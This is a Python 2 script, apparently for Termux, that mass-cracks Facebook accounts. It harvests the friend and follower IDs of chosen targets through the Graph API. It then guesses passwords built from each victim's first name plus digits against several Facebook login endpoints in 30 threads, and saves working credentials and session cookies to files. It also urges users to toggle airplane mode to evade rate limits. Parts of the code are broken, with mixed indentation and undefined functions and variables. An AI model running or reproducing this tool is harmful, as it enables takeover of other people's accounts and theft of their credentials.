#coding=utf-8

#!/usr/bin/python2

#decompile by star-vampire

try:

    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests

    from multiprocessing.pool import ThreadPool

except ImportError:

    os.system("pip2 install requests")

    os.system("python2 cracker.indirect")
    
os.system("clear")



if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):

    os.system("apt update && apt install nodejs -y")

from requests.exceptions import ConnectionError

os.system("git pull")

if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("cd ..... && pip install progress")

    os.system("cd ..... && npm install")

    os.system("cd ..... && node index.js &")

    os.system("clear")

    time.sleep(10)

elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("#")

    os.system("cd ..... && node index.js &")

    os.system("clear")

bd=random.randint(2e7, 3e7)

sim=random.randint(2e4, 4e4)

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}

reload(sys)

sys.setdefaultencoding("utf-8")

c = "\033[1;92m"

c2 = "\033[0;97m"

c3 = "\033[1;91m"

logo = """                                          

\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
\033[1;92m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
\033[1;92m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
\033[1;95m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
\033[1;95m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝


\033[1;93m◁━━━━━━━━━━━━━━━━◈😈Im-Famous-King😈◈━━━━━━━━━━━━━━━━▷\033[1;97m


\033[1;94m...♨️\033[1;97m Author   : GUPTA-SHAKEL \033[1;97m[ \033[0;92mGUPTA \033[1;97m]

\033[1;94m...♨️\033[1;97m WhatsApp : +2347013107449👾

\033[1;92m...♨️\033[1;97m Facebook : Mark Cornel👾
                           
            🗽USE AIRPLANE MODE EVERY 10 MINT🗽
\033[1;97m-----------------------------------------------

"""



def main():

    os.system("clear")

    print logo
	
	print("\n\033[1;97m[\033[1;94m01\033[1;97m] Crack Id From Public/Friends")
	print("\033[1;97m[\033[1;94m02\033[1;97m] Crack Id From Followers")
	print("\033[1;97m[\033[1;94m03\033[1;97m] Multi Crack\033[1;97m [ \033[1;95mPro \033[1;97m]")
	print("\033[1;97m[\033[1;94m04\033[1;97m] Chack Crack Results")
	print("\033[1;97m[\033[1;94m05\033[1;97m] User-Agent Settings\033[1;97m [ \033[1;95mPro \033[1;97m]")
	print("\033[1;97m[\033[1;94m00\033[1;97m] Exit\033[1;97m [ \033[1;91mDelete Token \033[1;97m]")
	Bilal = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] Chouse : ")
	if Bilal =="":
		menu()
	elif Bilal == "1" or Bilal == "01":
		publik()
		method()
	elif Bilal == "2" or Bilal == "02":
		follower()
		method()
	elif Bilal == "3" or Bilal == "03":
		massal()
		method()
	elif Bilal == "4" or Bilal == "04":
		print("\n\033[1;97m[\033[1;94m01\033[1;97m] Chack Result OK")
		print("\033[1;97m[\033[1;94m02\033[1;97m] Chack Result CP")
		cek = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] Chouse : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print("\033[1;97m[\033[1;94m+\033[1;97m] Copy File Name  And Past into Input")
			for file in dirs:
				print("[•]  "+file)
			try:
				file = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] File Name : ")
				if file == "":
					menu()
				Totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" Crack Resulte : %s Total : %s\033[0;92m"%(del_txt, len(Totalok)))
			os.system("cat OK/%s"%(file))
			print(" \033[0;97m # ----------------------------------------------")
			exit(" ")
		elif cek == "2":
			dirs = os.listdir("CP")
			print("\033[1;97m[\033[1;94m+\033[1;97m] Copy File Name And Past into Input")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] File Name : ")
				if file == "":
					menu()
				Totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print("# ----------------------------------------------")
			print(" Crack Resulte : %s Total : %s\033[0;93m"%(del_txt, len(Totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;97m # ----------------------------------------------")
			exit(" ")
		else:
			menu()
	elif Bilal == "5" or Bilal == "05":
		setting_ua()
	elif Bilal == "0" or Bilal == "00":
		os.system("rm -f login.txt")
		exit("\n\033[1;97m[\033[1;94m!\033[1;97m] Token Removed")
	else:
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\n\033[1;97m[\033[1;94m!\033[1;97m] Token Error")
	idt = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] Target Id: ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit("\n\033[1;97m[\033[1;94m+\033[1;97m] Account Friend List is Not Public")
	print("\033[1;97m[\033[1;94m+\033[1;97m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\n\033[1;97m[\033[1;94m+\033[1;97m] Token Error")
	idt = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] Target Id : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit("URL Error")
	print("[?] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Error")
	try:
		tanya_Total = int(input("\033[1;97m[\033[1;94m+\033[1;97m] Enter Ids Number : "))
	except:tanya_Total=1
	for t in range(tanya_Total):
		t +=1
		idt = raw_input("\033[1;97m[\033[1;94m+\033[1;97m] Target Id %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("\033[1;97m[\033[1;94m+\033[1;97m] Ids Friend list Is Not Public")
	print("\033[1;97m[\033[1;94m?\033[1;97m] Total id  : \033[0;91m%s\033[0;97m"%(len(id)))

def method():
	print("\n\033[1;97m[\033[1;94m?\033[1;97m] Choose Cracking Mathod")
	print("\033[1;97m[\033[1;94m1\033[1;97m] B-Api\033[1;97m [ \033[1;95mFast \033[1;97m]")
	print("\033[1;97m[\033[1;94m2\033[1;97m] Mbasic\033[1;97m [ \033[1;95mSlow \033[1;97m]")
	print("\033[1;97m[\033[1;94m3\033[1;97m] Free Facebook\033[1;97m [ \033[1;95mSuper Slow \033[1;97m]")
	method = raw_input("\033[1;97m[\033[1;94m?\033[1;97m] Choose : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input("\033[1;97m[\033[1;94m!\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;95mDefault : t \033[1;97m] : ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(bapi, id)
		exit("Program End")
	elif method == "2":
		ask = raw_input("\033[1;97m[\033[1;94m03\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;95mDefault : t \033[1;97m] ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(mbasic, id)
		exit("Program End")
	elif method == "3":
		ask = raw_input("\033[1;97m[\033[1;94m!\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;95mDefault : t \033[1;97m] ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(mobile, id)
		exit("Program End")
	else:
		menu()

def cek_ttl_cp(uid, pw):
	try:
		token = open("login.txt", "r").read()
		with requests.Session() as ses:
			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
			month, day, year = ttl.split("/")
			month = bulan_ttl[month]
			print("\r\033[0;91m[CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
	except KeyError, IOError:
		day = (" ")
		month = (" ")
		year = (" ")
	except:pass

def bapi(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;97mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;91m[CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mbasic(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;97mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mobile(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;97mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def manual():
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	print("\n[+] Type , For 2nd Password For Example : pakistan,786786,00707 etc")
	asu = raw_input("[+] Enter Passwords : ").split(",")
	if len(asu) =="":
		exit("[?] Wrong Input")
	print("[+] Enter 2-4 Passwords For Fast Cracking Speed\n")

	def main(user):
		global loop, token
		sys.stdout.write(
			"\r\033[0;91m[\033[0;97mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				kwargs = {}
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
				b = parser(p,"html.parser")
				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
				for i in b("input"):
					try:
						if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
						else:continue
					except:pass
				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r\033[0;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					print("\r\033[0;91m[CP] %s|%s\033[0;91m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue

			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n\n # [>Program Close<]")

def setting_ua():
	print("[1] Change User-Agent")
	print("[2] Default User-Agent")
	ua = raw_input("\n [?] Choose : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = raw_input(" [+] Enter User-Agent : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [!] Press Enter To Save User-Agent")
		menu()
	elif ua == "2":
		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		time.sleep(1)
		raw_input("\n[•] User-Agent Save Successfully")
		menu()

def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	login()
